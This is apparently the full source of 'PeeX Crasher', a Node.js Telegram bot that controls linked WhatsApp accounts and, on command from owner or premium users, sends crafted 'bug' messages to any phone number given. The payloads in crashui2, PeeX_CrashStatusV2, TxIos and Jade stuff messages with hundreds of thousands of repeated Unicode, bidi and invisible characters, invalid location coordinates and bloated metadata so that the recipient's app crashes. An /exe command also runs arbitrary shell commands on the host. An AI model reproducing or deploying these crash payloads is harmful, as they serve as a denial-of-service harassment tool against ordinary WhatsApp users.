// ------   PeeX Crasher   -----  //
// -  Kalo Rename Give Credit Ya - //
// - Credit : @LO_POO | PallxMods - //
// ----- Join t.me/sharingscript -----  ///

const { Telegraf, Markup } = require('telegraf');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  Browsers,
  makeInMemoryStore,
  DisconnectReason,
  getContentType,
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');
const moment = require('moment-timezone');
const axios = require('axios');

const config = require('./config.json');
let premiumData = [];
try {
  premiumData = require('./premium.json');
} catch (error) {
  console.error('Error reading premium.json:', error);
  console.log('Creating an empty premium.json...');
  fs.writeFileSync('./premium.json', '[]');
}

const bot = new Telegraf(config.botToken);
const sessionsDir = process.env.SESSION_DIR || './sessions';
const useStore = !process.argv.includes('--no-store');
if (!fs.existsSync(sessionsDir)) {
  fs.mkdirSync(sessionsDir);
}

function formatRuntime() {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  return `<span class="math-inline">\{hours\.toString\(\)\.padStart\(2, '0'\)\}\:</span>{minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

async function startWhatsAppClient(phoneNumber, ctx) {
  const sessionPath = path.join(sessionsDir, phoneNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

  const store = useStore ? makeInMemoryStore({}) : undefined;
  store && store.readFromFile && store.readFromFile(path.join(sessionPath, `${phoneNumber}_store.json`));
  setInterval(() => {
    store && store.writeToFile && store.writeToFile(path.join(sessionPath, `${phoneNumber}_store.json`));
  }, 10_000);

  const sock = makeWASocket({
    printQRInTerminal: false,
    auth: state,
    browser: Browsers.ubuntu('Chrome'),
    syncFullHistory: true,
    generateHighQualityLinkPreview: true,
    getMessage: async (key) => {
      if (store) {
        const msg = await (store.loadMessage && store.loadMessage(key.remoteJid, key.id));
        return (msg && msg.message) || undefined;
      }
      return undefined;
    },
  });

  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('connection.update', async (update) => {
    const connection = update.connection;
    const lastDisconnect = update.lastDisconnect;
    if (connection === 'close') {
      const shouldReconnect =
        lastDisconnect &&
        lastDisconnect.error &&
        lastDisconnect.error.output &&
        lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut;
      console.log(
        `[${phoneNumber}] Koneksi terputus karena `,
        lastDisconnect && lastDisconnect.error,
        ', reconnecting ',
        shouldReconnect
      );
      if (shouldReconnect) {
        setTimeout(() => {
          startWhatsAppClient(phoneNumber, ctx);
        }, 5000);
      } else {
        console.log(`[${phoneNumber}] Koneksi terputus: Perangkat terlogout`);
        ctx.reply && ctx.reply(
          `Bot WhatsApp untuk ${phoneNumber} terputus: Perangkat terlogout`
        );
        if (fs.existsSync(sessionPath)) {
          fs.rmSync(sessionPath, { recursive: true, force: true });
        }
      }
    } else if (connection === 'open') {
      console.log(`[${phoneNumber}] WhatsApp terhubung!`);
      ctx.reply && ctx.reply(`Bot WhatsApp untuk ${phoneNumber} berhasil terhubung!`);
    }
  });

  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    const msg = messages && messages[0];
    if (msg && !msg.key.fromMe && type === 'notify') {
    }
  });
  if (sock && sock.authState && !sock.authState.creds.registered) {
    try {
      await new Promise((resolve) => setTimeout(resolve, 5000));

      const phoneNumberWithCountryCode = phoneNumber.startsWith('0')
        ? '62' + phoneNumber.slice(1)
        : phoneNumber;
      const code = await sock.requestPairingCode(phoneNumberWithCountryCode);
      ctx.reply(`[${phoneNumber}] Pairing code: ${code}`);
      console.log(`[${phoneNumber}] Pairing code: ${code}`);
    } catch (error) {
      console.error('Error saat request pairing code:', error);
      ctx.reply && ctx.reply('Error saat request pairing code. Coba lagi /connect.');
    }
  }

  return sock;
}

const whatsappClients = {};
const cooldowns = new Map();

// --- Function Nih ---
async function crashui2(sock, nomor, ptcp = false) {
  const msg = {
    forward: {
      key: { fromMe: true },
      message: {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text: '🌿͜͞PeeX Crasher😋' + 'ꦾ'.repeat(300000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => '1@newsletter'),
                groupMentions: [
                  {
                    groupJid: '1@newsletter',
                    groupSubject: 'PeeX Authority',
                  },
                ],
              },
            },
          },
        },
      },
    },
  };
  if (ptcp) {
    msg.forward.message.groupMentionedMessage.message.interactiveMessage.contextInfo.participant = {
      jid: nomor,
    };
  }

  await sock.sendMessage(nomor, msg);
  console.log('✅ </> Succesfully Send Bug To ' + nomor + ' </> ✅ > Use Bug : Android');
}

async function PeeX_CrashStatusV2(sock, nomor, ptcp = false) {
    console.log(`🚀 Sending ULTRA CRASH to: ${nomor}`);

    let crashText = "🔥 Powered By PallxMods 🔥\u200B\u200C\u200D".repeat(200000);
    let weirdSymbols = "⛔⚠️🚀💀🔞🚫👻🥶🥵🤯🤡🤬😈👿".repeat(199999);
    let invisibleChars = "\u2063\u2064\u2065\u2066\u2067\u2068\u2069".repeat(50000);
    let bidiBug = "\u202A\u202B\u202C\u202D\u202E\u202F".repeat(50000);
    let rtlBug = "\u200F".repeat(99999);
    let bigCrashMessage = `${crashText}\n${weirdSymbols}\n${invisibleChars}\n${bidiBug}\n${rtlBug}`;

    const statusReply = {
        key: {
            remoteJid: "status@broadcast",
            fromMe: false,
            id: "PeeX",
            participant: ptcp ? ptcp : "0@s.whatsapp.net",
        },
        message: {
            text: bigCrashMessage,
        },
    };

    await sock.sendMessage(nomor, statusReply);
    console.log(`✅ Successfully Sent ULTRA CRASH to ${nomor}`);
}

async function TxIos(sock, nomor, ptcp = false) {
    const msg = {
        forward: {
            key: { fromMe: true },
            message: {
                extendedTextMessage: {
                    text: "🌿͜͞PeeX Crasher🌸",
                    contextInfo: {
                        stanzaId: "1234567890ABCDEF",
                        participant: "0@s.whatsapp.net",
                        quotedMessage: {
                            callLogMesssage: {
                                isVideo: true,
                                callOutcome: "1",
                                durationSecs: "0",
                                callType: "REGULAR",
                                participants: [{
                                    jid: "0@s.whatsapp.net",
                                    callOutcome: "1"
                                }]
                            }
                        },
                        remoteJid: nomor,
                        conversionSource: "source_example",
                        conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                        conversionDelaySeconds: 10,
                        forwardingScore: 9999999,
                        isForwarded: true,
                        quotedAd: {
                            advertiserName: "Example Advertiser",
                            mediaType: "IMAGE",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                            sourceType: " x ",
                            sourceId: " x ",
                            sourceUrl: "https://t.me/sharingscript",
                            mediaUrl: "https://t.me/sharingscript",
                            containsAutoReply: true,
                            renderLargerThumbnail: true,
                            showAdAttribution: true,
                            ctwaClid: "ctwa_clid_example",
                            ref: "ref_example"
                        },
                        entryPointConversionSource: "entry_point_source_example",
                        entryPointConversionApp: "entry_point_app_example",
                        entryPointConversionDelaySeconds: 5,
                        disappearingMode: {},
                        actionLink: {
                            url: "https://t.me/sharingscript"
                        },
                        groupSubject: "PeeX Crasher",
                        parentGroupJid: "0@s.whatsapp.net",
                        trustBannerType: "trust_banner_example",
                        trustBannerAction: 1,
                        isSampled: false,
                        utm: {
                            utmSource: "utm_source_example",
                            utmCampaign: "utm_campaign_example"
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@s.whatsapp.net",
                            serverMessageId: 1,
                            newsletterName: " X ",
                            contentType: "UPDATE",
                            accessibilityText: " X "
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "0@s.whatsapp.net"
                        },
                        smbClientCampaignId: "smb_client_campaign_id_example",
                        smbServerCampaignId: "smb_server_campaign_id_example",
                        dataSharingContext: {
                            showMmDisclosure: true
                        }
                    }
                }
            }
        },
    };
    if (ptcp) {
        msg.forward.message.extendedTextMessage.contextInfo.participant = {
          jid: nomor,
        };
      }
  await sock.sendMessage(nomor, msg);
  console.log("✅ </> Succesfully Send Bug To " + nomor + " </> ✅ > Use Bug : Ios");
}

async function Jade(sock, nomor, ptcp = true) {
  let FlashD = '🌿͜͞PeeX Crasherʐ🌸' + '𑇂𑆵𑆴𑆿'.repeat(50000) + 'ꦽ'.repeat(50000);
  const msg = {
    locationMessage: {
      degreesLatitude: 999.03499999999999,
      degreesLongitude: -999.03499999999999,
      name: FlashD,
      url: 'https://t.me/sharingscript',
    },
  };

  if (ptcp) {
    msg.participant = {
      jid: nomor,
    };
  }

  await sock.sendMessage(
    nomor,
    msg
  );
  console.log('✅ </> Succesfully Send Bug To ' + nomor + ' </> ✅ > Use Bug : Crash');
}

// --- Command Handlers ---
bot.command('help', async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : 'User';
  let userStatus = 'User';
  if (userId === config.ownerId) {
    userStatus = 'Owner';
  } else if (premiumData.includes(userId)) {
    userStatus = 'Premium';
  }
  const caption = `
___________________________________________
| 👤 **Username** : ${username}
| 🪧 **ID** : ${userId}
| 🔮 **Status** : ${userStatus}
|
| 💎  Premium Menu  💎
| - /android <number> | Android Bug
| - /ios <number> | IOS Bug 
| - /doc <number> | Document Bug
| - /crash <number> | Crash Bug
| - /ping | For Show Ping On Bot
|
| 🔱 Owner Menu 🔱
| - /addprem <ID> | Adds User To Prem
| - /delprem <ID> | Delete User In Prem
| - /connect <number> | Add Bot Bug
| - /disconnect <number> | Offline Bot
| - /exe <type> | Execute Command 
| - /setmode <self/public> | For Set Mode
|___________________________________________
`;

  try {
    await ctx.replyWithPhoto(
      { source: path.join(__dirname, 'img', 'help.png') },
      {
        caption: caption,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔱 Owner 🔱', url: 'https://t.me/lo_poo' }],
            [{ text: '🚨 News 🚨', url: 'https://t.me/sharingscript' }],
          ],
        },
      }
    );
  } catch (error) {
    console.error('Error sending photo:', error);
    ctx.reply('Maaf, terjadi kesalahan saat mengirim photo.');
  }
});

bot.command('android', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.ownerId && !premiumData.includes(userId)) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk pengguna Owner dan Premium. ❌');
  }
  const now = Date.now();
  const cooldownTime = 5 * 60 * 1000;
  const lastUsed = cooldowns.get(userId);
  if (lastUsed && now - lastUsed < cooldownTime) {
    const remainingTime = Math.ceil((lastUsed + cooldownTime - now) / 1000);
    return ctx.reply(`⏳ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi. ⏳`);
  }

  const command = ctx.message.text;
  const parts = command.split(' ');
  if (parts.length === 2) {
    const phoneNumber = parts[1];
    const targetNumber = phoneNumber + '@s.whatsapp.net';
    let clientKey;
    if (userId === config.ownerId) {
        clientKey = Object.keys(whatsappClients)[0];
    } else {
        clientKey = Object.keys(whatsappClients).find(key => phoneNumber.startsWith(key));
    }

    if (clientKey) {
      cooldowns.set(userId, now);
      try {
        await crashui2(whatsappClients[clientKey], targetNumber);
        ctx.reply(`✅ </> Succesfully Send Bug To ${targetNumber} </> ✅`);
      } catch (error) {
        console.error('Error:', error);
        ctx.reply('❌ Terjadi kesalahan saat mengirim bug. ❌');
      }
    } else {
      ctx.reply('❌ Bot WhatsApp tidak aktif atau nomor tidak valid. ❌');
    }
  } else {
    ctx.reply('😁🙏 Format salah. Gunakan: /android <nomor>');
  }
});

bot.command('ios', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.ownerId && !premiumData.includes(userId)) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk pengguna Owner dan Premium. ❌');
  }
  const now = Date.now();
  const cooldownTime = 5 * 60 * 1000;
  const lastUsed = cooldowns.get(userId);
  if (lastUsed && now - lastUsed < cooldownTime) {
    const remainingTime = Math.ceil((lastUsed + cooldownTime - now) / 1000);
    return ctx.reply(`⏳ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi. ⏳`);
  }

  const command = ctx.message.text;
  const parts = command.split(' ');
  if (parts.length === 2) {
    const phoneNumber = parts[1];
    const targetNumber = phoneNumber + '@s.whatsapp.net';
    let clientKey;
    if (userId === config.ownerId) {
        clientKey = Object.keys(whatsappClients)[0];
    } else {
        clientKey = Object.keys(whatsappClients).find(key => phoneNumber.startsWith(key));
    }

    if (clientKey) {
      cooldowns.set(userId, now);
      try {
        await TxIos(whatsappClients[clientKey], targetNumber);
        ctx.reply(`✅ </> Succesfully Send Bug To ${targetNumber} </> ✅`);
      } catch (error) {
        console.error('Error:', error);
        ctx.reply('❌ Terjadi kesalahan saat mengirim bug. ❌');
      }
    } else {
      ctx.reply('❌ Bot WhatsApp tidak aktif atau nomor tidak valid. ❌');
    }
  } else {
    ctx.reply('😁🙏 Format salah. Gunakan: /ios <nomor>');
  }
});

bot.command('crash', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.ownerId && !premiumData.includes(userId)) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk pengguna Owner dan Premium. ❌');
  }
  const now = Date.now();
  const cooldownTime = 5 * 60 * 1000;
  const lastUsed = cooldowns.get(userId);
  if (lastUsed && now - lastUsed < cooldownTime) {
    const remainingTime = Math.ceil((lastUsed + cooldownTime - now) / 1000);
    return ctx.reply(`⏳ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi. ⏳`);
  }

  const command = ctx.message.text;
  const parts = command.split(' ');
  if (parts.length === 2) {
    const phoneNumber = parts[1];
    const targetNumber = phoneNumber + '@s.whatsapp.net';

    let clientKey;
    if (userId === config.ownerId) {
        clientKey = Object.keys(whatsappClients)[0];
    } else {
        clientKey = Object.keys(whatsappClients).find(key => phoneNumber.startsWith(key));
    }

    if (clientKey) {
      cooldowns.set(userId, now);
      try {
        await Jade(whatsappClients[clientKey], targetNumber);
        ctx.reply(`✅ </> Succesfully Send Bug To ${targetNumber} </> ✅`);
      } catch (error) {
        console.error('Error:', error);
        ctx.reply('❌ Terjadi kesalahan saat mengirim bug. ❌');
      }
    } else {
      ctx.reply('❌ Bot WhatsApp tidak aktif atau nomor tidak valid. ❌');
    }
  } else {
    ctx.reply('😁🙏 Format salah. Gunakan: /crash <nomor>');
  }
});

bot.command('PeeX', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (userId !== config.ownerId && !premiumData.includes(userId)) {
        return ctx.reply('❌ Maaf, perintah ini hanya untuk pengguna Owner dan Premium. ❌');
    }

    const now = Date.now();
    const cooldownTime = 5 * 60 * 1000;
    const lastUsed = cooldowns.get(userId);
    if (lastUsed && now - lastUsed < cooldownTime) {
        const remainingTime = Math.ceil((lastUsed + cooldownTime - now) / 1000);
        return ctx.reply(`⏳ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi. ⏳`);
    }

    const command = ctx.message.text;
    const parts = command.split(' ');
    if (parts.length === 2) {
        const phoneNumber = parts[1];

        let clientKey;
        if (userId === config.ownerId) {
            clientKey = Object.keys(whatsappClients)[0];
        } else {
            clientKey = Object.keys(whatsappClients).find(key => phoneNumber.startsWith(key));
        }

        if (clientKey && whatsappClients[clientKey]) {
            cooldowns.set(userId, now);
            try {
                console.log(`🚀 Mengirim crash ke: ${phoneNumber} via ${clientKey}`);
                ctx.reply(`⏳ Mengirim bug ke ${phoneNumber}...`);
                await PeeX_CrashStatusV2(whatsappClients[clientKey], phoneNumber + "@s.whatsapp.net");

                ctx.reply(`✅ Successfully Sent Crash To ${phoneNumber} ✅`);
            } catch (error) {
                console.error('❌ Error:', error);
                ctx.reply('❌ Terjadi kesalahan saat mengirim bug. ❌');
            }
        } else {
            ctx.reply('❌ Bot WhatsApp tidak aktif atau nomor tidak valid. ❌');
        }
    } else {
        ctx.reply('😁🙏 Format salah. Gunakan: /PeeX <nomor>');
    }
});

bot.command('ping', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== config.ownerId && !premiumData.includes(userId)) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk pengguna Owner dan Premium. ❌');
  }

  const start = new Date();

  const osType = os.type();
  const ramUsed = Math.round((os.totalmem() - os.freemem()) / 1024 / 1024);
  const totalRam = Math.round(os.totalmem() / 1024 / 1024);
  const cpuInfo = os.cpus();
  const cpuCores = cpuInfo ? cpuInfo.length : 'N/A';
  const cpuModel = cpuInfo && cpuInfo[0] ? cpuInfo[0].model : 'N/A';
  const caption = `
**PeeX Crasher**
> OS : ${osType}
> RAM USED : ${ramUsed} MB / ${totalRam} MB
> CPU CORES : ${cpuCores}
> CPU MODEL : ${cpuModel}
> RUNTIME : ${formatRuntime()}
©️ PallxMods
`;

  try {
    await ctx.reply(caption, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error sending ping response:', error);
    ctx.reply('Maaf, terjadi kesalahan saat mengirim informasi server.');
  }
});

bot.command('addprem', async (ctx) => {
  if (ctx.from.id.toString() !== config.ownerId) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk owner. ❌');
  }

  const command = ctx.message.text;
  const parts = command.split(' ');
  if (parts.length === 2) {
    const newPremId = parts[1];
    if (!premiumData.includes(newPremId)) {
      premiumData.push(newPremId);
      fs.writeFileSync('./premium.json', JSON.stringify(premiumData));
      ctx.reply(`✅ Berhasil menambahkan ${newPremId} ke premium user. ✅`);
    } else {
      ctx.reply(`ℹ️ ${newPremId} sudah ada di dalam list premium user. ℹ️`);
    }
  } else {
    ctx.reply('😁🙏 Oi ner pake /addprem <id> jir');
  }
});

bot.command('delprem', async (ctx) => {
  if (ctx.from.id.toString() !== config.ownerId) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk owner. ❌');
  }

  const command = ctx.message.text;
  const parts = command.split(' ');
  if (parts.length === 2) {
    const premIdToDelete = parts[1];
    const index = premiumData.indexOf(premIdToDelete);
    if (index > -1) {
      premiumData.splice(index, 1);
      fs.writeFileSync('./premium.json', JSON.stringify(premiumData));
      ctx.reply(`✅ Berhasil menghapus ${premIdToDelete} dari premium user. ✅`);
    } else {
      ctx.reply(`ℹ️ ${premIdToDelete} tidak ditemukan di dalam list premium user. ℹ️`);
    }
  } else {
    ctx.reply('😁🙏 oi ner pake /delprem <id> ya🗿');
  }
});

bot.command('connect', async (ctx) => {
  if (ctx.from.id.toString() !== config.ownerId) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk owner. ❌');
  }

  try {
    const command = ctx.message.text;
    const parts = command.split(' ');
    if (parts.length === 2) {
      const phoneNumber = parts[1];
      if (!/^\d+$/.test(phoneNumber)) {
        return ctx.reply('Nomor telepon tidak valid. Hanya boleh angka.');
      }

      if (whatsappClients[phoneNumber]) {
        return ctx.reply('Bot WhatsApp untuk nomor ini sudah aktif.');
      }
      ctx.reply(
        `Menghubungkan ke WhatsApp untuk nomor ${phoneNumber}...\nSilakan tunggu, bot akan mengirimkan kode pairing`
      );
      const client = await startWhatsAppClient(phoneNumber, ctx);
      whatsappClients[phoneNumber] = client;
    } else {
      ctx.reply('😁🙏 oi ner pake nya gini /connect 62xxx 😉');
    }
  } catch (error) {
    console.error('Unhandled error while processing /connect:', error);
    ctx.reply('Terjadi kesalahan saat memproses perintah.');
  }
});

bot.command('disconnect', async (ctx) => {
  if (ctx.from.id.toString() !== config.ownerId) {
    return ctx.reply('❌ Maaf, perintah ini hanya untuk owner. ❌');
  }

  const command = ctx.message.text;
  const parts = command.split(' ');

  if (parts.length === 2) {
    const phoneNumber = parts[1];

    if (whatsappClients[phoneNumber]) {
      try {
        await whatsappClients[phoneNumber].logout();
        delete whatsappClients[phoneNumber];
        const sessionPath = path.join(sessionsDir, phoneNumber);
        if (fs.existsSync(sessionPath)) {
          fs.rmSync(sessionPath, { recursive: true, force: true });
        }
        ctx.reply(`Bot WhatsApp untuk ${phoneNumber} berhasil diputus.`);
      } catch (error) {
        console.error(`Error saat disconnecting ${phoneNumber}:`, error);
        ctx.reply(`Gagal memutuskan koneksi WhatsApp untuk ${phoneNumber}.`);
      }
    } else {
      ctx.reply(`Bot WhatsApp untuk ${phoneNumber} tidak aktif.`);
    }
  } else {
    ctx.reply('😁🙏 oi ner pake command nya gini /disconnect 62xxx 😉');
  }
});

bot.command('exe', async (ctx) => {
  if (ctx.from.id.toString() !== config.ownerId) {
      return ctx.reply("❌ Maaf, perintah ini hanya untuk owner. ❌");
  }

  const command = ctx.message.text;
  const parts = command.split(" ");
  if (parts.length >= 2) {
      const cmd = parts.slice(1).join(" ");
      exec(cmd, (error, stdout, stderr) => {
          let result = "";
          if (error) {
              result += `Error: ${error.message}\n`;
          }
          if (stderr) {
              result += `Stderr: ${stderr}\n`;
          }
          if (stdout) {
              result += `${stdout}\n`;
          }
          ctx.reply("`" + result + "`", { parse_mode: 'Markdown' });
      });
  } else {
      ctx.reply("😁🙏 woila pake command nya gini /exe <type> 🥳");
  }
});

bot.command('setmode', async (ctx) => {
  if (ctx.from.id.toString() !== config.ownerId) {
      return ctx.reply("❌ Maaf, perintah ini hanya untuk owner. ❌");
  }

  const command = ctx.message.text;
  const parts = command.split(" ");
  if (parts.length === 2) {
      const newMode = parts[1].toLowerCase();
      if (newMode === "self" || newMode === "public") {
          config.mode = newMode;
          fs.writeFileSync("./config.json", JSON.stringify(config, null, 2));
          ctx.reply(`✅ Mode bot berhasil diubah ke ${newMode}. ✅`);
      } else {
          ctx.reply("ℹ️ Mode yang tersedia hanya 'self' atau 'public'. ℹ️");
      }
  } else {
      ctx.reply("😁🙏 oi ner pake nya gini /setmode <self/public> ☺️");
  }
});

bot.command('start', async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username
    ? `<a href="tg://user?id=<span class="math-inline">\{userId\}"\>@</span>{ctx.from.username}</a>`
    : 'User';
  let userStatus = 'User';
  if (userId === config.ownerId) {
    userStatus = 'Owner';
  } else if (premiumData.includes(userId)) {
    userStatus = 'Premium';
  }

  const botMode = config.mode === 'self' ? 'Self' : 'Public';
  const caption = `
<b>PeeX Bot</b>

👋 Hello <a href="tg://user?id=${ctx.from.id}">@${ctx.from.username || 'User'}</a> Use /help
😊 Welcome On PeeX Bot

🤖 <b>Bot Information</b>
├ <b>Bot Name:</b> ${config.botName}
├ <b>Version:</b> ${config.version}
├ <b>Status:</b> ${userStatus}
├ <b>Mode:</b> ${botMode}
├ <b>Creator:</b> <a href="https://t.me/lo_poo">@LO_POO</a>
`;

  try {
    await ctx.replyWithVideo(
      { source: path.join(__dirname, 'vid', 'start.mp4') },
      {
        caption: caption,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔱 Creator 🔱', url: 'https://t.me/lo_poo/' }],
            [{ text: '🚨 Lapor Bug 🚨', url: 'https://t.me/lo_poo' }],
            [{ text: '🌐 Official Site 🌐', url: 'https://bx.com' }],
            [{ text: `🕐 Runtime: ${formatRuntime()} 🕐`, callback_data: 'noop' }],
          ],
        },
      }
    );
  } catch (error) {
    console.error('Error sending video:', error);
    ctx.reply('Maaf, terjadi kesalahan saat mengirim video.');
  }
});

bot.launch();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));